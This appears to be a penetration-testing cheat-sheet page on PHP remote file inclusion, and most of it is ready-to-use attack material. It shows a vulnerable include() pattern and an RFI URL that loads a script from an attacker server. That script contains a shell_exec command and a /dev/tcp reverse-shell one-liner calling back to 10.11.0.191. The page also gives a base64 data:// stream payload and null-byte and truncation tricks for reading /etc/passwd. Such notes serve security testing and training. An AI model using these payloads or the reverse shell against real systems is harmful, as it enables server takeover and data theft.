# Remote File Inclusion

A remote file inclusion vulnerability lets the attacker execute a script on the target-machine even though it is not even hosted on that machine.  RFI's are less common than LFI. Because in order to get them to work the developer must have edited the `php.ini` configuration file.

## Direct Remote Include

Consider an unsanitized parameter:

```
$incfile = $_REQUEST["file"];
include($incfile.".php");
```

Now what you can do is to include a file that is not hosted on the victim-server, but instead on the attackers server.

```
http://example.com/index.php?page=http://attackerserver.com/evil.txt
```

And evil.txt will look like something like this:

```
<?php echo shell_exec("whoami");?>

# Or just get a reverse shell directly like this:
<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>
```

So when the victim-server includes this file it will automatically execute the commands that are in the evil.txt file. And we have a RCE.

## Data Filters

This only applies for PHP &gt; 5.2 with allow\\_url\\_include enabled.  By providing a php script encoded within base64, we can use the data stream filter to potentially execute PHP code in the event of an RFI.  The below is an encoded `phpinfo()`:

```
http://example.com/index.php?file=data://text/plain;base64,PD8gcGhwaW5mbygpOyA/Pg==
```

## PHP Input

## Fixing Extensions

Before php version 5.3 add the nullbyte `%00` to avoid appending `.php` and/or terminate the string to bypass url filtering.

If it does not work you can also add a `?`, this way the rest will be interpreted as url parameters.

Truncation of the string can also work depending on any environments this may be passed through:

```
http://example.com/index.php?page=/etc/passwd..............................
http://example.com/index.php?page=http://mysite.com/AAAAAAAAAAAAAAAAAAAAAAAAAAAA.php
```

## References

[https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/](https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/)



